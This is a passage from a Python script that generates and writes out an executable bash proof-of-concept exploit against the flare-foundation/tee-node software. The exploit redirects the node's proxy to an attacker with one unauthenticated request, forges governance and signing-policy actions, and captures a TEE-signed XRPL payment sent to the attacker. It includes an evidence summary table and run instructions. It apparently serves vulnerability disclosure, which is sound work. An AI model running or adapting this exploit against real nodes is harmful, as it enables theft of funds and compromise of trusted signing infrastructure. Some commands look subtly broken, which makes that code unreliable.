    if [ -n "$LEGIT_TEEID" ] && [ "$LEGIT_TEEID" = "$TEEID" ]; then
      ok "D1 - pre-attack and post-attack responses carry the SAME node identity: the hijacked node IS the node that was serving the legitimate flow"
    fi
    if forge governance-hash >/dev/null; then
      GH=$(cat "$WS/out.json")
      grep -qi "${GH#0x}" "$WS/teeinfo-attacker.json" \
        && ok "D1 - captured governance is committed into the node's attested info (GovernanceHash match)" \
        || info "D1 - GovernanceHash grep miss; inspect forger/01-teeinfo-response.json"
    fi

    R1=$(nc $ATTACKER_URL/stats | jqf .results)
    if ! forge init-policy >/dev/null || ! push_action; then fail "D2: forge/push failed"; break; fi
    if ! wait_count "$ATTACKER_URL" "$R1" results 20 >/dev/null; then fail "D2: no result for InitializePolicy"; break; fi
    body_at "$R1" > "$EV/forger/02-policy-capture-response.json"
    info "D2 - policy result captured (authoritative proof arrives transitively in D4)"

    R2=$(nc $ATTACKER_URL/stats | jqf .results)
    if ! forge key-generate >/dev/null || ! push_action; then fail "D3: forge/push failed"; break; fi
    if ! wait_count "$ATTACKER_URL" "$R2" results 20 >/dev/null; then fail "D3: no result for KeyGenerate"; break; fi
    body_at "$R2" > "$EV/forger/03-keygenerate-response.json"
    grep -qi "Signers\|PublicKey" "$EV/forger/03-keygenerate-response.json" \
      && ok "D3 - TEE MINTED A WALLET under the captured policy (key existence proof returned)" \
      || info "D3 - inspect forger/03-keygenerate-response.json"

    R3=$(nc $ATTACKER_URL/stats | jqf .results)
    if ! forge xrp-pay >/dev/null || ! push_action; then fail "D4: forge/push failed"; break; fi
    wait_count "$ATTACKER_URL" "$R3" results 15 >/dev/null 2>&1 || true
    sleep 6
    NEW=$(nc $ATTACKER_URL/stats | jqf .results)
    FOUND=""
    for i in $(seq "$R3" $((NEW-1))); do
      b=$(body_at "$i")
      if echo "$b" | grep -q "Signers"; then echo "$b" > "$WS/xrp-captured.json"; FOUND=1; break; fi
    done
    if [ -n "$FOUND" ] && CAPTURE="$WS/xrp-captured.json" forge verify-xrp | tee "$EV/forger/04-verification.txt"; then
      cp "$WS/xrp-captured.json" "$EV/forger/04-xrppay-signed-transactions.json"
      ok "D4 - TERMINAL IMPACT VERIFIED: TEE-signed result containing VALIDLY MULTI-SIGNED XRPL payment transaction(s), exfiltrated to the attacker - the node executed a payment authored entirely by the attacker"
    else
      fail "D4 - XRP payment verification failed (see $EV/forger/)"
    fi
    break
  done
fi

# ============================================================ SUMMARY ======
phase "SUMMARY"
nc $LEGIT_URL/stats > "$EV/stats-after.json"
nc $ATTACKER_URL/stats     > "$EV/stats-attacker.json"
nc $ATTACKER_URL/received  > "$EV/05-all-captured-results.json"
dc logs tee-node    > "$EV/node.log" 2>&1
dc logs legit-proxy > "$EV/legit-proxy.log" 2>&1
dc logs attacker    > "$EV/attacker.log" 2>&1
LEG=$(nc $LEGIT_URL/stats | jqf .polls)
LRES=$(nc $LEGIT_URL/stats | jqf .results)
ATT=$(nc $ATTACKER_URL/stats | jqf .polls)
SGN=$(nc $ATTACKER_URL/stats | jqf .signed_results)
cat >> "$EV/SUMMARY.txt" <<EOF

target:      flare-foundation/tee-node $TAG  ($(git -C "$WS/repo" rev-parse --short HEAD 2>/dev/null))
netmode:     $NETMODE
attack cost: ONE unauthenticated HTTP POST from an unprivileged network peer
detection:   NONE at node level (proxyHandler logs nothing; proxy URL absent from Node.Info()/attestation)

metric                              BEFORE              AFTER
----------------------------------  ------------------  ------------------
node -> legit proxy polls           ${POLLS} (rising)     ${LEG} (frozen)
legit proxy results (actions)       ${LRES}               ${LRES} (frozen)
node -> attacker polls              0                    ${ATT}
TEE-signed results to attacker      0                    ${SGN}
proxy URL (trust anchor)            $PROXY_TARGET        $ATTACKER_URL
chain-id (env-provisioned)          set                  set - REFUSED attacker (set-once)
governance / initial owner          (unset)              attacker
signing policy                      (uninitialized)     attacker (Phase 6)
XRPL payment signed by TEE          -                    YES, verified (Phase 6)
EOF
cat "$EV/SUMMARY.txt"
( cd "$EV" && sha256sum SUMMARY.txt *.json forger/*.json forger/*.txt 2>/dev/null > SHA256SUMS )
[ "$FAILED" = "0" ] && echo -e "\n${G}RESULT: ALL ASSERTIONS PASSED - evidence: $EV${N}" \
                    || echo -e "\n${R}RESULT: SOME ASSERTIONS FAILED - inspect $EV${N}"
exit "$FAILED"
"""

MARKERS = (
    "#!/usr/bin/env bash",
    "SELF-TEST",
    "PHASE 0a",
    "PHASE 0b",
    "PHASE 6",
    "POC_FORGER_CMD",
    "TERMINAL IMPACT",
    "forger_test.go",
    "--noproxy '*'",
    'NO_PROXY: "*"',
    'HTTP_PROXY: ""',
    "write_compose",
    "network_mode: host",
    "HOSTNET",
    "config -q",
    "printf '%4s'",
    "Y='\\033[1;33m'",
)

def main():
    missing = [m for m in MARKERS if m not in POC]
    if missing:
        sys.exit("payload corrupted - missing markers: %r" % (missing,))
    if "\r" in POC:
        sys.exit("payload corrupted - CRLF detected")
    # regression guard for the rev-4 bug class: heredoc/echo variable lines
    # carrying leading whitespace would mis-indent the generated compose file
    if re.search(r'^[ \t]+\$(top|netline)\b', POC, re.M):
        sys.exit("payload corrupted: $top/$netline line has leading whitespace (rev-4 bug class)")
    poc = POC if POC.endswith("\n") else POC + "\n"
    with open("poc.sh", "w", encoding="utf-8", newline="\n") as f:
        f.write(poc)
    os.chmod("poc.sh", 0o755)
    data = poc.encode("utf-8")
    print("written : poc.sh (executable, rev 5)")
    print("lines   : %d" % poc.count("\n"))
    print("bytes   : %d" % len(data))
    print("sha256  : %s" % hashlib.sha256(data).hexdigest())
    print()
    print("next    : ./poc.sh --keep --quick --hostnet   (Codespaces / firewalled hosts)")
    print("         ./poc.sh --keep --quick             (bridge mode)")
    print("         ./poc.sh --keep --hostnet           (full run incl. forger)")

main()
